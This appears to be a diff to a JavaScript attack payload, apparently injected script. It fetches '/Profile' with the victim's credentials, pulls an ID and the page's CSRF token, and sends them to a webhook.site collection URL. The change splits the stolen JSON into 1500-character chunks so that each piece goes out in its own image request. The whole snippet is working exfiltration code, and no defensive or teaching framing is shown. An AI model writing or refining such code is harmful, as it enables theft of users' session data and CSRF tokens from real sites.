@@ -9,7 +9,8 @@ fetch('/Profile',{credentials:'include'})
       canId:(d.match(/CanId":(\d+)/)||[])[1]||'',
       csrf:window._CSRFToken
     };
-    var img = new Image();
-    img.src = 'https://webhook.site/dbffcd4a-59b3-4a3b-8de2-453266989ae4?d=' + encodeURIComponent(JSON.stringify(data));
-    document.body.appendChild(img);
+    var json = JSON.stringify(data);
+    for(let i=0;i<json.length;i+=1500){
+      new Image().src='https://webhook.site/dbffcd4a-59b3-4a3b-8de2-453266989ae4?part='+i+'&d='+encodeURIComponent(json.substring(i,i+1500));
+    }
   })
